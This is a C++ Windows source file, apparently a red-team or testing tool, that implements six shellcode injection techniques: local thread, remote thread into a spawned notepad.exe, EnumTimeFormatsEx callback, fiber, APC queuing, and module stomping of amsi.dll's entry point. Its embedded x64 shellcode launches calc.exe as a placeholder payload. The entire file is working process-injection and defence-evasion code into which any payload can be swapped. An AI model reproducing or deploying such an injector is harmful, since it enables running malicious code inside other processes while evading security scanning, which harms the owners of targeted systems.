#include <windows.h>
#include <stdio.h>


unsigned char shellcodeBuf64[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x07\x41\x83\xc1\x01\x41"
"\x01\xc1\xe2\xe9\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6B\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5A\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x07\x41\x83\xc1\x01\x41\x01\xc1\x38\xe0\x75\xed\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd4\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x09\x01\x00\x00\x41\xba\xd1\xb8\x7c"
"\x4c\xff\xd5\xbb\x87\x18\x21\x75\x41\xba\x7f\x39\xa4\x01\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x79\x20\xfc\x96\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
"\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65\x78"
"\x65\x00";

wchar_t TARGET_PROCESS_NAME[32] = L"C:\\WINDOWS\\system32\\notepad.exe";

HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
HMODULE hKernelbase = GetModuleHandleW(L"kernelbase.dll");

typedef PVOID(WINAPI* VirtualAllocAddr)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* CreateThreadAddr)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
typedef PVOID(WINAPI* CreateProcessWAddr)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef PVOID(WINAPI* OpenProcessAddr)(DWORD, BOOL, DWORD);
typedef PVOID(WINAPI* SleepAddr)(DWORD dwMilliseconds);
typedef BOOL(WINAPI* VirtualProtectAddr)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef BOOL(WINAPI* WriteProcessMemoryAddr)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* ReadProcessMemoryAddr)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef PVOID(WINAPI* VirtualAllocExAddr)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* CreateRemoteThreadAddr)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI*  EnumProcessModulesAddr)(HANDLE  hProcess,HMODULE* lphModule,DWORD   cb,LPDWORD lpcbNeeded);
typedef DWORD(WINAPI* GetModuleBaseNameAddr)(HANDLE  hProcess, HMODULE lphModule, LPSTR lpBaseName, DWORD nSize);
typedef DWORD(WINAPI* GetThreadContextAddr)(HANDLE  hThread, int* context);


VirtualAllocAddr pVirtualAlloc = (VirtualAllocAddr)GetProcAddress(hKernel32, "VirtualAlloc");
CreateThreadAddr pCreateThread = (CreateThreadAddr)GetProcAddress(hKernel32, "CreateThread");
CreateProcessWAddr pCreateProcessW = (CreateProcessWAddr)GetProcAddress(hKernel32, "CreateProcessW");
OpenProcessAddr pOpenProcess = (OpenProcessAddr)GetProcAddress(hKernel32, "OpenProcess");
SleepAddr pSleepAddr = (SleepAddr)GetProcAddress(hKernel32, "Sleep");
WriteProcessMemoryAddr pWriteProcessMemory = (WriteProcessMemoryAddr)GetProcAddress(hKernel32, "WriteProcessMemory");
ReadProcessMemoryAddr pReadProcessMemory = (ReadProcessMemoryAddr)GetProcAddress(hKernel32, "ReadProcessMemory");
VirtualAllocExAddr pVirtualAllocEx = (VirtualAllocExAddr)GetProcAddress(hKernel32, "VirtualAllocEx");
CreateRemoteThreadAddr pCreateRemoteThread = (CreateRemoteThreadAddr)GetProcAddress(hKernel32, "CreateRemoteThread");
VirtualProtectAddr pVP = (VirtualProtectAddr)GetProcAddress(hKernel32, "VirtualProtect");
EnumProcessModulesAddr pEnum = (EnumProcessModulesAddr)GetProcAddress(hKernelbase, "EnumProcessModules");
GetModuleBaseNameAddr getBaseAddr = (GetModuleBaseNameAddr)GetProcAddress(hKernelbase, "GetModuleBaseNameA");
GetThreadContextAddr pGetThreadContext = (GetThreadContextAddr)GetProcAddress(hKernelbase, "GetThreadContext");


#pragma comment(lib, "ntdll")
using NtTestAlert = NTSTATUS(NTAPI*)();

void LocalSelfInjection()
{
	printf("[>] Execute shellcode via Local injection\n\n");
	LPVOID shellcodeMem = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_READWRITE);
	if (shellcodeMem != NULL)
	{
		if (RtlCopyMemory(shellcodeMem, shellcodeBuf64, sizeof(shellcodeBuf64)))
		{
			DWORD old_protect = NULL;
			pVP(shellcodeMem, sizeof(shellcodeBuf64), 0x40, &old_protect);

			DWORD shellcodeThreadId = 1;
			HANDLE shellcodeExec = pCreateThread(NULL, 0, LPTHREAD_START_ROUTINE(shellcodeMem), 0, 0, &shellcodeThreadId);

			WaitForSingleObject(shellcodeExec, 500);
		}
	}
}

void RemoteShellcodeInjection()
{
	printf("[>] Remotely execute shellcode via CreateRemoteThread injection\n\n");
	STARTUPINFO startupInfo = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	PVOID newNotepad = pCreateProcessW(TARGET_PROCESS_NAME, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &startupInfo, &processInfo);
	pSleepAddr(2);
	if (newNotepad)
	{
		pSleepAddr(2);
		HANDLE openNotepad = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
		if (openNotepad != NULL)
		{
			PVOID allocNotepad = pVirtualAllocEx(openNotepad, NULL, sizeof(shellcodeBuf64), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
			if (allocNotepad != NULL)
			{
				BOOL ret = pWriteProcessMemory(openNotepad, allocNotepad, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);

				if (ret != 0)
				{
					DWORD lpThreadId = 1;
					pVirtualAllocEx(openNotepad, NULL, 10, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
					pSleepAddr(2);
					HANDLE execRemotePayload = pCreateRemoteThread(openNotepad, NULL, 0, LPTHREAD_START_ROUTINE(allocNotepad), NULL, 0, &lpThreadId);
					pSleepAddr(2);
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
					CloseHandle(openNotepad);
				}
			}
		}
	}
}

void EnumTimeFormatsExInjection()
{
	printf("[>] Execute shellcode via EnumTimeFormatsEx injection\n\n");
	LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (allocShellcode != NULL)
	{
		if (memcpy(allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64)))
		{
			EnumTimeFormatsEx(TIMEFMT_ENUMPROCEX(allocShellcode), LOCALE_NAME_USER_DEFAULT, 0, NULL);
		}
	}
}

void CreateFiberInjection()
{
	printf("[>] Execute shellcode via CreateFiber injection\n\n");
	HANDLE currentThread = GetCurrentThread();

	LPVOID convertThreadFiber = ConvertThreadToFiber(NULL);
	if (convertThreadFiber != NULL) {
		LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (allocShellcode != NULL)
		{
			if (memcpy(allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64)))
			{
				LPVOID createNewFiber = CreateFiber(0, LPFIBER_START_ROUTINE(allocShellcode), NULL);
				if (createNewFiber != NULL) {
					SwitchToFiber(createNewFiber);
					DeleteFiber(createNewFiber);
				}
			}
		}
	}
}

void QueueUserAPCInjection()
{
	printf("[>] Execute shellcode via QueueUserAPC injection\n\n");
	LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READ);
	if (allocShellcode != NULL)
	{
		HANDLE currentProc = GetCurrentProcess();
		BOOL ret = pWriteProcessMemory(currentProc, allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
		if (ret != 0)
		{
			HANDLE currentThread = GetCurrentThread();
			PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE(allocShellcode));

			DWORD queueApc = QueueUserAPC((PAPCFUNC)apcRoutine, currentThread, NULL);
			if (queueApc != 0)
			{
				NtTestAlert pTestAlert = (NtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
				pTestAlert();
			}
			CloseHandle(currentThread);
			CloseHandle(currentProc);
		}
	}
}

void ModuleStompingInjection() {
	wchar_t moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";
	STARTUPINFO startupInfo = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	HMODULE hMods[2048] = {};
	DWORD modulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T modulesCount = 0;
	CHAR remoteModuleName[128] = {};
	HMODULE remoteModule = NULL;
	printf("[>] Execute shellcode via ModuleStomping / Module EntryPoint injection\n\n");
	PVOID newNotepad = pCreateProcessW(TARGET_PROCESS_NAME, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &startupInfo, &processInfo);
	pSleepAddr(2);
	if (newNotepad)
	{
		pSleepAddr(2);
		HANDLE openNotepad = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);

		if (openNotepad != NULL)
		{
			PVOID remoteBuffer = pVirtualAllocEx(openNotepad, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
			if (remoteBuffer != NULL)
			{
				BOOL ret = pWriteProcessMemory(openNotepad, remoteBuffer, moduleToInject, sizeof(moduleToInject), NULL);
				//pSleepAddr(2);
				if (ret != 0)
				{
					PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
					HANDLE dllThread = CreateRemoteThread(openNotepad, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
					WaitForSingleObject(dllThread, 1000);

					BOOL res = pEnum(openNotepad, hMods, sizeof(hMods), &modulesSizeNeeded);
					modulesCount = modulesSizeNeeded / sizeof(HMODULE);
					for (size_t i = 0; i < modulesCount; i++)
					{
						remoteModule = hMods[i];
						getBaseAddr(openNotepad, remoteModule, remoteModuleName, sizeof(remoteModuleName));
						if (_strcmpi(remoteModuleName, "amsi.dll") == 0)
						{
							break;
						}
					}
					DWORD headerBufferSize = 0x1000;
					LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
					ret = pReadProcessMemory(openNotepad, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);
					if (ret != 0) {
						PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
						PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
						LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
						ret = pWriteProcessMemory(openNotepad, dllEntryPoint, (LPCVOID)shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
						if (ret != 0) {
							HANDLE execRemotePayload = pCreateRemoteThread(openNotepad, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
							pSleepAddr(2);
							CloseHandle(processInfo.hProcess);
							CloseHandle(processInfo.hThread);
							CloseHandle(openNotepad);
						}
					}
				}
			}
		}
	}
}



int main(int argc, char* argv[])
{
	if (argc == 1)
	{
		fprintf(stdout,
			"\t/LIJ     Local Thread Injection\n"
			"\t/RIJ     RemoteThread Injection\n"
			"\t/TIJ     EnumTimeFormatsEx Injection\n"
			"\t/FIJ     Fiber Injection\n"
			"\t/QIJ     APC Injection \n"
			"\t/MSIJ    Module Stomping Injection \n");
	}
	if (strcmp(argv[1], "/LIJ") == 0)
	{
		LocalSelfInjection();
	}
	if (strcmp(argv[1], "/RIJ") == 0)
	{
		RemoteShellcodeInjection();
	}
	if (strcmp(argv[1], "/TIJ") == 0)
	{
		EnumTimeFormatsExInjection();
	}
	if (strcmp(argv[1], "/FIJ") == 0)
	{
		CreateFiberInjection();
	}
	if (strcmp(argv[1], "/MSIJ") == 0)
	{
		ModuleStompingInjection();
	}
	return 0;
}
